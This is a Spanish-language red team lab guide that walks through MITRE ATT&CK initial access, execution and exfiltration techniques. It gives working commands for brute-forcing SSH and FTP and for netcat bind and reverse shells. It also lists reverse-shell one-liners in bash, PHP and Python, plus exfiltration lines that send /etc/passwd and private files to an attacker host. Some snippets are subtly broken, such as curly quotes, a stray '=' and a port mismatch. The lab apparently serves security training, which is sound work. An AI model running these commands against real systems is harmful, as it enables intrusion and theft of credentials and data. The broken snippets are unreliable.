# Laboratorio 11. Técnicas de Red Team a través del MITRE ATT&CK (Parte 1)

## Bloque 1. MITRE ATT&CK fase 3. TA0001 Initial Access

### NMap y Metasploit Framework (MSF)
Realizamos un escaneo de servicios con nmap y lo exportamos a XML
```sh
nmap -sV -oX resultados.xml <IP>
```

Inicializamos Metasploit Framework
```sh
service postgresql start
msfdb init 
msfconsole -q
```

Importamos el escaneo de nmap
```sh
db_import resultados.xml
```

Podemos identificar hosts, filtrar por columnas e identificar hosts "vivos"
```sh
hosts
hosts -c address,purpose
hosts -u
```

También podemos identificar servicios de los hosts, filtrando tanto por puerto como por tipo de protocolo.
```sh
services
services -p 80
services -p tcp
```

### Enumerar posibles archivos ocultos con información interesante (T1190. Exploit Public-Facing Application)
Podemos enumerar directorios de una web con dirb
```sh
dirb http://<IP>/dir/
dirb http://<IP>/dir/ -X .html #Busca archivos con una extensión determinada
```

### Exfiltración a través de directorios compartidos por SMB (T1190. Exploit Public-Facing Application)
Podemos enumerar los recursos compartidos de un host con smbmap
```sh
smbmap -H 192.168.11.3 -r /etc/passwd
```

Si encontramos algún recurso con permisos nos podemos conectar mediante smbclient
```sh
smbclient //192.168.11.3/GollumShare
```

Desde la consola podemos navegar por los recursos, y si queremos descargar alguno usamos get

### Diccionarios de contraseñas de palabras comunes contra objetivos concretos (1078. Valid Accounts)
Podemos generar una lista de palabras presentes en una web, por si estas se usan como contraseña de algún usuario
```sh
cewl -m 5 -w words.txt <URL>
```
En este caso guardamos en el archivo words.txt las palabras con una longitud mínima de 5 caracteres.

### Fuerza bruta en línea con Nmap (1078. Valid Accounts)
Podemos aplicar ataques de fuerza bruta contra diferentes servicios que encontremos con nmap
```sh
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <IP-del-servidor>
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt <IP-del-servidor>
```

## Bloque 2: MITRE ATT&CK fase 4. TA0002 Execution

### Netcat como herramienta de escucha (TA1059. Command and Scripting Interpreter)
Con netcat podemos ponernos en escucha por cualquier puerto. De este modo podemos lanzarle peticiones, como por ejemplo con telnet,
```sh
nc -lvp <PUERTO>        #Máquina en escucha
telnet <IP> <PUERTO>    #Máquina atacante
```

### Bind shell con netcat (TA1059. Command and Scripting Interpreter)
Ponemos un puerto en escucha en la máquina víctima, que cuando alguien se conecte ejecute una shell. 
```sh
nc -lvp <PUERTO> -e /bin/bash
```
Y nos conectamos desde la máquina atacante
```sh
nc <IP> <PUERTO>
```

### Reverse shell con netcat (TA1059. Command and Scripting Interpreter)
Una forma menos "sospechosa" de obtener una consola remota es con una reverse shell. 
```sh
nc -lvp <PUERTO>                # Nos ponemos en escucha en la máquina víctima
nc <IP> <PUERTO> -e /bin/sh     # Desde la máquina víctima nos conectamos
```

### Reverse shell sin netcat (TA1059. Command and Scripting Interpreter)
Si netcat no está disponible en el sistema remoto se pueden usar otras formas
```sh
bash -i >& /dev/tcp/<IP de la máquina atacante>/<PUERTO> 0>&1

php -r ‘$sock=fsockopen(“<IP de la máquina atacante>”,<PUERTO>);exec(“/bin/sh -i <&3 >&3 2>&3”);’

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP de la máquina atacante>",<PUERTO>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);=subprocess.call(["/bin/sh","-i"]);’
```

### Searchploit (T1203. Exploitation for Client Execution)
Podemos buscar si existen exploits disponibles para servicios y versiones conocidas.
```sh
searchploit <Tecnología> <Versión>
```

Estos exploits se encuentran en /usr/share/exploitdb/exploits

## Bloque 3: MITRE ATT&CK fase 9-10: TA0009. Collection / TA0010. Exfiltration
Vamos a extraer información de un sistema remoto usando la técnica de los GTFOBins
```sh
wget --post-file=/etc/passwd <IP del atacante>                                              # La máquina atacante escucha por el puerto 80

bash -c 'echo -e "POST / HTTP/0.9\n\n$(</etc/passwd)" > /dev/tcp/<IP del atacante>/8000'    # La máquina atacante escucha por el puerto 43

nc -lvp 8000 < fichero_privado.txt              # Máquina víctima
nc <IP de la víctima> 8000 > datos_robados.txt  # Máquina atacante

curl -X POST -d @data.txt <IP del atacante>     # Máquina víctima
nc -lvp 80 > data.txt                           # Máquina atacante

finger "$(cat /etc/passwd)@<IP del atacante>"   # El atacante escucha en el puerto 79

php -S 0.0.0.0:8080                             # Máquina víctima
wget <IP de la víctima>:8080/data.txt           # Máquina atacante
```